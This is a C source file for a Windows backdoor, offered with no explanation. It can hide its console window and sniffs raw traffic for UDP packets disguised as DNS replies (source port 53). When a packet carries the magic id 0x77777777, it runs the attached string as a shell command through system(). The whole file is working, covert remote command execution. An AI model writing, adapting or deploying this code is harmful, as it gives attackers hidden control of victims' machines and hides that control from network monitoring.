#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "mstcpip.h"
#include <string.h>
#include <shellapi.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

typedef struct IPPacketHead
{
	unsigned char h_len:4;
	unsigned char h_ver:4;
	unsigned char tos;
	unsigned char total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
} IPHeader;

typedef struct UDPPacketHead
{
	unsigned short SortPort;
	unsigned short DestPort;
	unsigned short Len;
	unsigned short ChkSum;
} UDPHeader;

typedef struct _CMDShell
{
	unsigned long id;
	char cmd[256];
} CMDShell;

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("usage:shell -h hidden window.\n");
		printf("usage:shell -s show   window.\n");
		system("pause");
		return 0;
	}
	if (argc == 2 && argv[1][1] == 'h')
	{
		HWND h = GetForegroundWindow();
		if (h==NULL)
		{
			printf("cannot hide.\n");
			system("pause");
			return 0;
		}
		ShowWindow(h, SW_HIDE);
		h = NULL;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);
	SOCKET s;
	s = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	
	BOOL flag = TRUE;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));
	
	char hostname[256] = {0};
	gethostname(hostname, sizeof(hostname));
	
	struct hostent *host;
	host = gethostbyname(hostname);

	struct sockaddr_in local;
	local.sin_port = htons(4444);
	local.sin_family = AF_INET;
	memcpy(&local.sin_addr.S_un.S_addr, host->h_addr_list[0], host->h_length);
	bind(s, (const sockaddr*)&local, sizeof(local));

	DWORD dwSet = 1;
	ioctlsocket(s, SIO_RCVALL, &dwSet);

	char buffer[65535] = {0};
	if (WSAGetLastError() != 0)
	{
		printf("Error: %d\n", WSAGetLastError());
		closesocket(s);
		WSACleanup();
	}

	printf("begining listen........\n");
	for (; recv(s, buffer, sizeof(buffer), 0) > 1; memset(buffer, 0, sizeof(buffer)))
	{
		IPHeader *pIp = (IPHeader*)buffer;
		if (pIp->proto != IPPROTO_UDP) continue;
		in_addr addr;
		addr.S_un.S_addr = pIp->sourceIP;

		unsigned char *pOffset;
		pOffset = (unsigned char*)pIp;
		pOffset += pIp->h_len*4;

		UDPHeader *pUdp = (UDPHeader*)pOffset;
		if (pUdp->SortPort != htons(53)) continue;
		
		pOffset += 8;
		CMDShell *cmd = (CMDShell*)(pOffset);
		if (cmd->id != 0x77777777) continue;
		
		printf("Saddr:%s",inet_ntoa(addr));
		printf(" cmd:%s\n", cmd->cmd);
		system(cmd->cmd);
		printf("\n");
	}
	closesocket(s);
	WSACleanup();
	return 0;
}